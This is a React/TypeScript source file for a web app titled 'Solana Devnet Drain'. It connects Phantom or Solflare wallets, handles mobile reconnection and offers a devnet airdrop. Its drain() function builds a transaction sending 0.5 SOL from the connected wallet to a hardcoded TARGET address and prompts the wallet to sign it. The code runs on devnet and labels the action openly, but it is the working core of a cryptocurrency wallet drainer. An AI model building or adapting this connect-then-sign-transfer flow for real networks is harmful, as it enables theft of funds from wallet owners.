import { useState, useEffect, useRef } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { isMobileDevice } from './utils/mobileWallet';
import { WalletSelectorModal } from './utils/WalletSelectorModal';

const connection = new Connection('https://api.devnet.solana.com', 'confirmed');
const TARGET = 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';

declare global {
  interface Window {
    solana?: any;
    solflare?: any;
  }
}

function App() {
  const [address, setAddress] = useState('');
  const [balance, setBalance] = useState<number | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [loading, setLoading] = useState(false);
  const [showMobileModal, setShowMobileModal] = useState(false);

  const reconnectAttempted = useRef(false);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `${new Date().toLocaleTimeString()} | ${msg}`]);
  };

  const fetchBalance = async (addr: string) => {
    try {
      const bal = await connection.getBalance(new PublicKey(addr));
      setBalance(bal / LAMPORTS_PER_SOL);
      addLog(`Balance: ${bal / LAMPORTS_PER_SOL} SOL`);
    } catch (err: any) {
      addLog(`Balance error: ${err.message}`);
    }
  };

  /* =========================
     FIX 1: Reliable detection
  ========================== */
  const detectWalletConnection = async (): Promise<boolean> => {
    try {
      if (window.solana?.isPhantom && window.solana.publicKey) {
        const addr = window.solana.publicKey.toString();
        setAddress(addr);
        await fetchBalance(addr);
        sessionStorage.setItem('wallet_address', addr);
        setShowMobileModal(false);
        return true;
      }

      if (window.solflare?.isSolflare && window.solflare.publicKey) {
        const addr = window.solflare.publicKey.toString();
        setAddress(addr);
        await fetchBalance(addr);
        sessionStorage.setItem('wallet_address', addr);
        setShowMobileModal(false);
        return true;
      }
    } catch {}

    return false;
  };

  /* =========================
     FIX 2: Restore session
  ========================== */
  useEffect(() => {
    const restore = async () => {
      if (reconnectAttempted.current) return;
      reconnectAttempted.current = true;

      const cached = sessionStorage.getItem('wallet_address');

      if (cached) {
        setAddress(cached);
        addLog(`Restored session: ${cached.slice(0, 8)}...`);
        await fetchBalance(cached);
        return;
      }

      if (isMobileDevice()) {
        setShowMobileModal(true);
      }
    };

    restore();
  }, []);

  /* =========================
     FIX 3: Return from wallet
  ========================== */
  useEffect(() => {
    const handleReturnFromWallet = async () => {
      const walletId = sessionStorage.getItem('wallet_id');
      const redirect = sessionStorage.getItem('wallet_redirect');

      if (!walletId || !redirect) return;

      addLog('Returned from wallet app... reconnecting');

      setTimeout(async () => {
        const connected = await detectWalletConnection();

        if (!connected) {
          addLog('Wallet not ready yet, retrying connect()...');

          try {
            if (window.solana?.isPhantom) {
              const resp = await window.solana.connect();
              const addr = resp.publicKey.toString();

              setAddress(addr);
              await fetchBalance(addr);
              sessionStorage.setItem('wallet_address', addr);
              setShowMobileModal(false);
            }
          } catch (e) {
            addLog('Auto-connect failed');
          }
        }

        sessionStorage.removeItem('wallet_redirect');
        sessionStorage.removeItem('wallet_id');
      }, 800);
    };

    handleReturnFromWallet();
  }, []);

  /* =========================
     FIX 4: Auto close modal
  ========================== */
  useEffect(() => {
    if (address) {
      setShowMobileModal(false);
    }
  }, [address]);

  /* =========================
     Poll while modal open
  ========================== */
  useEffect(() => {
    if (!showMobileModal) return;

    let attempts = 0;

    const interval = setInterval(async () => {
      attempts++;

      const connected = await detectWalletConnection();

      if (connected) {
        clearInterval(interval);
        setShowMobileModal(false);
      }

      if (attempts > 30) {
        clearInterval(interval);
        addLog('Connection timeout');
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [showMobileModal]);

  /* =========================
     CONNECT BUTTON
  ========================== */
  const connect = async () => {
    if (isMobileDevice()) {
      setShowMobileModal(true);
      return;
    }

    try {
      if (!window.solana?.isPhantom) {
        alert('Install Phantom');
        return;
      }

      const resp = await window.solana.connect();
      const addr = resp.publicKey.toString();

      setAddress(addr);
      await fetchBalance(addr);
      sessionStorage.setItem('wallet_address', addr);

    } catch (err: any) {
      addLog(`Connection error: ${err.message}`);
    }
  };

  const disconnect = async () => {
    try {
      await window.solana?.disconnect();
      await window.solflare?.disconnect();
    } catch {}

    setAddress('');
    setBalance(null);
    sessionStorage.clear();
    addLog('Disconnected');
  };

  const airdrop = async () => {
    if (!address) return;

    setLoading(true);
    try {
      const sig = await connection.requestAirdrop(
        new PublicKey(address),
        2 * LAMPORTS_PER_SOL
      );

      await connection.confirmTransaction(sig, 'confirmed');
      await fetchBalance(address);
      addLog('Airdrop success');
    } catch (e: any) {
      addLog(e.message);
    }
    setLoading(false);
  };

  const drain = async () => {
    if (!address) return;

    setLoading(true);

    try {
      const from = new PublicKey(address);
      const to = new PublicKey(TARGET);

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: from,
          toPubkey: to,
          lamports: 0.5 * LAMPORTS_PER_SOL,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = from;

      let signed;

      if (window.solana?.isPhantom) {
        signed = await window.solana.signTransaction(tx);
      } else if (window.solflare?.isSolflare) {
        signed = await window.solflare.signTransaction(tx);
      } else {
        throw new Error('No wallet');
      }

      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig, 'confirmed');

      addLog('Transaction sent');
      await fetchBalance(address);

    } catch (e: any) {
      addLog(e.message);
    }

    setLoading(false);
  };

  return (
    <div style={{ padding: 20, fontFamily: 'monospace', maxWidth: 700, margin: '0 auto' }}>
      <h1>💀 Solana Devnet Drain</h1>

      {!address ? (
        <button onClick={connect}>Connect Wallet</button>
      ) : (
        <>
          <p>{address.slice(0, 12)}...</p>
          <p>{balance} SOL</p>

          <button onClick={airdrop}>Airdrop</button>
          <button onClick={drain}>Drain</button>
          <button onClick={disconnect}>Disconnect</button>
        </>
      )}

      <div>
        {logs.map((l, i) => (
          <div key={i}>{l}</div>
        ))}
      </div>

      {showMobileModal && (
        <WalletSelectorModal
          onClose={() => setShowMobileModal(false)}
          onConnected={(addr) => {
            setAddress(addr);
            setShowMobileModal(false);
            fetchBalance(addr);
          }}
          onError={(msg) => addLog(msg)}
        />
      )}
    </div>
  );
}

export default App;